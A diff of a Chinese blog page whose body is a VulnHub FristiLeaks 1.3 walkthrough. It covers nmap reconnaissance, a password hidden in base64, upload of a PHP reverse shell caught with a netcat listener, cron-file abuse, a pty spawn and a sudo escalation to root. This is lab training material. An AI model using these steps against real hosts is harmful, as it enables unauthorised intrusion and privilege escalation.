@@ -75,7 +75,7 @@
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gck9a342i4j31660ixk59.jpg">
 <meta property="article:published_time" content="2020-03-01T09:14:46.000Z">
 <meta property="article:modified_time" content="2021-08-06T03:57:37.031Z">
-<meta property="article:author" content="Dana Shaw">
+<meta property="article:author" content="肖坤稼">
 <meta property="article:tag" content="vulnhub靶机练习">
 <meta property="article:tag" content="FristiLeaks_1.3">
 <meta name="twitter:card" content="summary">
@@ -152,7 +152,8 @@
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
-        <p class="site-subtitle">为了去往别处</p>
+        <h1 class="site-subtitle" itemprop="description">为了去往别处</h1>
+      
   </div>
 
   <div class="site-nav-toggle">
@@ -227,9 +228,7 @@
     <i class="fa fa-search"></i>
   </span>
   <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="none"
-           placeholder="搜索..." spellcheck="false"
-           type="text" id="search-input">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="搜索..." spellcheck="false" type="text" id="search-input">
   </div>
   <span class="popup-btn-close">
     <i class="fa fa-times-circle"></i>
@@ -269,7 +268,7 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/./images/photo.jpg">
-      <meta itemprop="name" content="Dana Shaw">
+      <meta itemprop="name" content="肖坤稼">
       <meta itemprop="description" content="连尘埃也想收藏">
     </span>
 
@@ -277,9 +276,9 @@
       <meta itemprop="name" content="Dana Shaw's blog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
+        <h2 class="post-title" itemprop="name headline">
           vulnhub靶机练习之FristiLeaks_1.3
-        </h1>
+        </h2>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -341,20 +340,20 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="探测靶机"><a href="#探测靶机" class="headerlink" title="探测靶机"></a>探测靶机</h2><p>首先修改虚拟机的mac地址。<a target="_blank" rel="noopener" href="https://docs.vmware.com/cn/VMware-Workstation-Pro/12.0/com.vmware.ws.using.doc/GUID-5C55C285-79B0-404F-95A5-87F64C41E3DC.html">vmware修改虚拟机MAC地址的方法</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gceuhdjd7cj30nw0q3406.jpg" alt="image.png"></p>
+        <h2 id="探测靶机"><a href="#探测靶机" class="headerlink" title="探测靶机"></a>探测靶机</h2><p>首先修改虚拟机的mac地址。<a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.vmware.com/cn/VMware-Workstation-Pro/12.0/com.vmware.ws.using.doc/GUID-5C55C285-79B0-404F-95A5-87F64C41E3DC.html">vmware修改虚拟机MAC地址的方法</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gceuhdjd7cj30nw0q3406.jpg" alt="image.png"></p>
 <p><escape> <span id="more"></span></escape><br>记得，虚拟机要改成NAT模式。<br>靶机IP为：192.168.80.21</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo arp-scan -l</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:b2:07:af, IPv4: 192.168.80.14</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.80.1    00:50:56:c0:00:08       VMware, Inc.</span><br><span class="line">192.168.80.2    00:50:56:fc:96:a7       VMware, Inc.</span><br><span class="line">192.168.80.21   08:00:27:a5:a6:76       PCS Systemtechnik GmbH</span><br><span class="line">192.168.80.254  00:50:56:e0:3c:3f       VMware, Inc.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.109 seconds (121.38 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>
 <h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p>扫描发现靶机开放了80端口，并且robots.txt拒绝爬取<code>/cola</code>、<code>/sisi</code>、<code>/beer</code>这三个路径。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -A -T5 -sS 192.168.80.21</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-06 00:30 EST</span><br><span class="line">Nmap scan report for 192.168.80.21</span><br><span class="line">Host is up (0.00081s latency).</span><br><span class="line">Not shown: 999 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">| http-robots.txt: 3 disallowed entries </span><br><span class="line">|_/cola /sisi /beer</span><br><span class="line">|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X|3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.81 ms 192.168.80.21</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 25.40 seconds</span><br></pre></td></tr></table></figure>
-<p>访问这些路径，发现打开都是这一张图片。<br><a target="_blank" rel="noopener" href="http://192.168.80.21/cola/">http://192.168.80.21/cola/</a><br><a target="_blank" rel="noopener" href="http://192.168.80.21/sisi/">http://192.168.80.21/sisi/</a><br><a target="_blank" rel="noopener" href="http://192.168.80.21/beer/">http://192.168.80.21/beer/</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gck5j5wmcnj30zo0ngakh.jpg" alt="image.png"><br>拓展知识：</p>
+<p>访问这些路径，发现打开都是这一张图片。<br><a target="_blank" rel="external nofollow noopener noreferrer" href="http://192.168.80.21/cola/">http://192.168.80.21/cola/</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="http://192.168.80.21/sisi/">http://192.168.80.21/sisi/</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="http://192.168.80.21/beer/">http://192.168.80.21/beer/</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gck5j5wmcnj30zo0ngakh.jpg" alt="image.png"><br>拓展知识：</p>
 <blockquote>
 <p>用curl查看http请求头详情信息：</p>
 </blockquote>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.80.21/sisi/ -v</span><br><span class="line">*   Trying 192.168.80.21:80...</span><br><span class="line">* TCP_NODELAY set</span><br><span class="line">* Connected to 192.168.80.21 (192.168.80.21) port 80 (#0)</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> GET /sisi/ HTTP/1.1</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Host: 192.168.80.21</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> User-Agent: curl/7.67.0</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Accept: */*</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Fri, 06 Mar 2020 13:42:59 GMT</span><br><span class="line">&lt; Server: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3</span><br><span class="line">&lt; Last-Modified: Wed, 25 Nov 2015 09:11:42 GMT</span><br><span class="line">&lt; ETag: &quot;3225-21-52559d8c3444b&quot;</span><br><span class="line">&lt; Accept-Ranges: bytes</span><br><span class="line">&lt; Content-Length: 33</span><br><span class="line">&lt; Connection: close</span><br><span class="line">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="line">&lt; </span><br><span class="line">&lt;img src=&quot;/images/3037440.jpg&quot;/&gt;</span><br><span class="line">* Closing connection 0</span><br></pre></td></tr></table></figure>
-<h2 id="登录系统"><a href="#登录系统" class="headerlink" title="登录系统"></a>登录系统</h2><p>目录爆破（暂时没有爆破出来;)）得到网站登录入口地址：<a target="_blank" rel="noopener" href="http://192.168.80.21/fristi/">http://192.168.80.21/fristi/</a><br>查看网页源码，提示我们：用户ezeepz用户的密码在base64字符串里面。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gck7y4ac2lj30zn0n9td9.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gck7t17gouj30zj0ndag7.jpg" alt="image.png"><br>我们将base64字符串解码存为png图片。</p>
+<h2 id="登录系统"><a href="#登录系统" class="headerlink" title="登录系统"></a>登录系统</h2><p>目录爆破（暂时没有爆破出来;)）得到网站登录入口地址：<a target="_blank" rel="external nofollow noopener noreferrer" href="http://192.168.80.21/fristi/">http://192.168.80.21/fristi/</a><br>查看网页源码，提示我们：用户ezeepz用户的密码在base64字符串里面。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gck7y4ac2lj30zn0n9td9.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gck7t17gouj30zj0ndag7.jpg" alt="image.png"><br>我们将base64字符串解码存为png图片。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ echo &#x27;iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0klS0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+fm63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJZv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvbDpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNdjJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg104VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLqi1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2FgtOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HKul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12qmD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFheEPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJRU5ErkJggg==&#x27; | base64 -d &gt; evidence-6.png</span><br></pre></td></tr></table></figure>
 <p>打开这个图片，获得用户密码是：<code>keKkeKKeKKeKkEkkEk</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gck80jrerlj30zt0no7ki.jpg" alt="image.png"><br>使用获取到的用户和密码（eezeepz/keKkeKKeKKeKkEkkEk），登录到系统：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gck8276pjsj30zs0nfab3.jpg" alt="image.png"></p>
-<h2 id="php反弹shell"><a href="#php反弹shell" class="headerlink" title="php反弹shell"></a>php反弹shell</h2><p>kali自带的webshell脚本位于<code>/usr/share/webshells/php</code>，我们修改这个<code>php-reverse-shell.php</code>。IP改为靶机IP（192.168.80.14），端口改为靶机监听端口（6666）。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gck8rcp18xj30oy0iqaed.jpg" alt="image.png"><br>上传<code>php-reverse-shell.php</code>至靶机之后，访问url：<a target="_blank" rel="noopener" href="http://192.168.80.21/fristi/uploads/php-reverse-shell.php.png">http://192.168.80.21/fristi/uploads/php-reverse-shell.php.png</a> 即可进入apache用户的shell。</p>
+<h2 id="php反弹shell"><a href="#php反弹shell" class="headerlink" title="php反弹shell"></a>php反弹shell</h2><p>kali自带的webshell脚本位于<code>/usr/share/webshells/php</code>，我们修改这个<code>php-reverse-shell.php</code>。IP改为靶机IP（192.168.80.14），端口改为靶机监听端口（6666）。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gck8rcp18xj30oy0iqaed.jpg" alt="image.png"><br>上传<code>php-reverse-shell.php</code>至靶机之后，访问url：<a target="_blank" rel="external nofollow noopener noreferrer" href="http://192.168.80.21/fristi/uploads/php-reverse-shell.php.png">http://192.168.80.21/fristi/uploads/php-reverse-shell.php.png</a> 即可进入apache用户的shell。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:/usr/share/webshells/php$ nc -nlvp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.80.14] from (UNKNOWN) [192.168.80.21] 43835</span><br><span class="line">Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"> 10:19:44 up  1:55,  0 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=48(apache) gid=48(apache) groups=48(apache)</span><br><span class="line">sh: no job control in this shell</span><br></pre></td></tr></table></figure>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">sh-4.1$ ccdd  eeeezzeeeeppzz</span><br><span class="line"></span><br><span class="line">sh-4.1$ llss</span><br><span class="line"></span><br><span class="line">MAKEDEV</span><br><span class="line">cbq</span><br><span class="line">cciss_id</span><br><span class="line">cfdisk</span><br><span class="line">chcpu</span><br><span class="line">chgrp</span><br><span class="line">chkconfig</span><br><span class="line">chmod</span><br><span class="line">chown</span><br><span class="line">clock</span><br><span class="line">consoletype</span><br><span class="line">cpio</span><br><span class="line">cryptsetup</span><br><span class="line">ctrlaltdel</span><br><span class="line">cut</span><br><span class="line">halt</span><br><span class="line">hostname</span><br><span class="line">hwclock</span><br><span class="line">kbd_mode</span><br><span class="line">kill</span><br><span class="line">killall5</span><br><span class="line">kpartx</span><br><span class="line">nameif</span><br><span class="line">nano</span><br><span class="line">netreport</span><br><span class="line">netstat</span><br><span class="line">new-kernel-pkg</span><br><span class="line">nice</span><br><span class="line">nisdomainname</span><br><span class="line">nologin</span><br><span class="line">notes.txt</span><br><span class="line">tar</span><br><span class="line">taskset</span><br><span class="line">tc</span><br><span class="line">telinit</span><br><span class="line">touch</span><br><span class="line">tracepath</span><br><span class="line">tracepath6</span><br><span class="line">true</span><br><span class="line">tune2fs</span><br><span class="line">weak-modules</span><br><span class="line">wipefs</span><br><span class="line">xfs_repair</span><br><span class="line">ypdomainname</span><br><span class="line">zcat</span><br><span class="line">zic</span><br><span class="line">sh-4.1$ ccaatt  nnootteess..ttxxtt</span><br><span class="line"></span><br><span class="line">Yo EZ,</span><br><span class="line"></span><br><span class="line">I made it possible for you to do some automated checks, </span><br><span class="line">but I did only allow you access to /usr/bin/* system binaries. I did</span><br><span class="line">however copy a few extra often needed commands to my </span><br><span class="line">homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those</span><br><span class="line">from /home/admin/</span><br><span class="line"></span><br><span class="line">Don&#x27;t forget to specify the full path for each binary!</span><br><span class="line"></span><br><span class="line">Just put a file called &quot;runthis&quot; in /tmp/, each line one command. The </span><br><span class="line">output goes to the file &quot;cronresult&quot; in /tmp/. It should </span><br><span class="line">run every minute with my account privileges.</span><br><span class="line"></span><br><span class="line">- Jerry</span><br></pre></td></tr></table></figure>
 <p>进入<code>/temp</code>目录，新建文件<code>runthis</code>设置计划任务（这个计划任务每分钟执行），修改<code>/home/admin</code>的权限为777，使得ezeepz可访问admin目录的内容。</p>
@@ -370,7 +369,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh-4.1$ ssuu  --  ffrriissttiiggoodd</span><br><span class="line"></span><br><span class="line">standard in must be a tty</span><br></pre></td></tr></table></figure>
 <p>这里无法登录fristigod用户，要进入完全shell模式。<br>拓展知识：</p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="http://blog.sina.com.cn/s/blog_6c0267490102wnmn.html">sh和bash的区别</a><br><code>/bin/sh</code>相当于<code>/bin/bash --posix</code>，sh跟bash的区别，实际上就是bash有没有开启<a target="_blank" rel="noopener" href="https://blog.csdn.net/MONKEY_D_MENG/article/details/5621749">posix模式</a>的区别。</p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="http://blog.sina.com.cn/s/blog_6c0267490102wnmn.html">sh和bash的区别</a><br><code>/bin/sh</code>相当于<code>/bin/bash --posix</code>，sh跟bash的区别，实际上就是bash有没有开启<a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/MONKEY_D_MENG/article/details/5621749">posix模式</a>的区别。</p>
 </blockquote>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">h-4.1$ ppyytthhoonn  --cc  &#x27;&#x27;iimmppoorrtt  ppttyy;;ppttyy..ssppaawwnn((&quot;&quot;//bbiinn//bbaasshh&quot;&quot;))&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">bash-4.1$ ssuu  --  ffrriissttiiggoodd</span><br><span class="line"></span><br><span class="line">Password: LetThereBeFristi!</span><br><span class="line"></span><br><span class="line">-bash-4.1$ wwhhooaammii</span><br><span class="line"></span><br><span class="line">fristigod</span><br></pre></td></tr></table></figure>
 <p>登入fistigod用户之后，查看命令历史：</p>
@@ -380,7 +379,7 @@
 <p>于是进入root的shell终端，拿到flag：<code>Y0u_kn0w_y0u_l0ve_fr1st1</code>。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-bash-4.1$ ^[[Asudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id^^//bbiinn//bbaasshh</span><br><span class="line"></span><br><span class="line">bash-4.1# ccdd  //rroooott</span><br><span class="line"></span><br><span class="line">bash-4.1# llss</span><br><span class="line"></span><br><span class="line">fristileaks_secrets.txt</span><br><span class="line">bash-4.1# ccaatt  ffrrii        stileaks_secrets.txt </span><br><span class="line"></span><br><span class="line">Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]</span><br><span class="line"></span><br><span class="line">I wonder if you beat it in the maximum 4 hours it&#x27;s supposed to take!</span><br><span class="line"></span><br><span class="line">Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Flag: Y0u_kn0w_y0u_l0ve_fr1st1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bash-4.1# wwhhooaammii</span><br><span class="line"></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>主要学习利用本地文件上传漏洞，上传php反弹shell脚本（kali自带的webshell脚本）。<br><code>python  -c  &#39;import  pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>这条命令可以将不完全的shell变为完全shell。<br>通过命令历史，找到提权的方式。</p>
-<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a target="_blank" rel="noopener" href="https://kongwenbin.wordpress.com/2017/12/31/write-up-for-fristileaks-v1-3-vulnhub/">https://kongwenbin.wordpress.com/2017/12/31/write-up-for-fristileaks-v1-3-vulnhub/</a></p>
+<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://kongwenbin.wordpress.com/2017/12/31/write-up-for-fristileaks-v1-3-vulnhub/">https://kongwenbin.wordpress.com/2017/12/31/write-up-for-fristileaks-v1-3-vulnhub/</a></p>
 
     </div>
 
@@ -392,21 +391,21 @@
 <div>
 <ul class="post-copyright">
   <li class="post-copyright-author">
-    <strong>本文作者： </strong>Dana Shaw
+    <strong>本文作者： </strong>肖坤稼
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
     <a href="https://dana5haw.com/posts/ZH-CN/Vulnhub_FristiLeaks.html" title="vulnhub靶机练习之FristiLeaks_1.3">https://dana5haw.com/posts/ZH-CN/Vulnhub_FristiLeaks.html</a>
   </li>
   <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
   </li>
 
   <div class="wechat_OA">
 	<span>欢迎关注我的公众号(Welcome to follow me on Wechat)</span>
 	<br>
     <!-- 这里添加你的二维码图片 -->
-	<img src ="https://v2ray.dana5haw.com:8008/images/2021/08/03/qrcode_for_gh_9b7280eb1edc_258.jpg">
+	<img src="https://v2ray.dana5haw.com:8008/images/2021/08/03/qrcode_for_gh_9b7280eb1edc_258.jpg">
 </div>
 
 </ul>
@@ -507,18 +506,17 @@
       <div class="post-toc-wrap sidebar-panel">
           <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8B%E9%9D%B6%E6%9C%BA"><span class="nav-number">1.</span> <span class="nav-text">探测靶机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nmap%E6%89%AB%E6%8F%8F"><span class="nav-number">2.</span> <span class="nav-text">nmap扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9F"><span class="nav-number">3.</span> <span class="nav-text">登录系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">4.</span> <span class="nav-text">php反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%99%BB%E5%85%A5fristigod%E7%94%A8%E6%88%B7%E5%B9%B6%E6%8F%90%E6%9D%83"><span class="nav-number">5.</span> <span class="nav-text">登入fristigod用户并提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E5%8D%9A%E6%96%87"><span class="nav-number">7.</span> <span class="nav-text">参考博文</span></a></li></ol></div>
       </div>
-        <div id="">
+        <div id>
 	  <canvas id="canvas" style="width:60%;">
-	    </div>
+	    </canvas></div>
 	      <script type="text/javascript" src="/js/canvas-dance-time.js"></script>
       <!--/noindex-->
 
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="Dana Shaw"
-      src="/./images/photo.jpg">
-  <p class="site-author-name" itemprop="name">Dana Shaw</p>
+    <img class="site-author-image" itemprop="image" alt="肖坤稼" src="/./images/photo.jpg">
+  <p class="site-author-name" itemprop="name">肖坤稼</p>
   <div class="site-description" itemprop="description">连尘埃也想收藏</div>
 </div>
 <div class="site-state-wrap motion-element">
@@ -526,7 +524,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
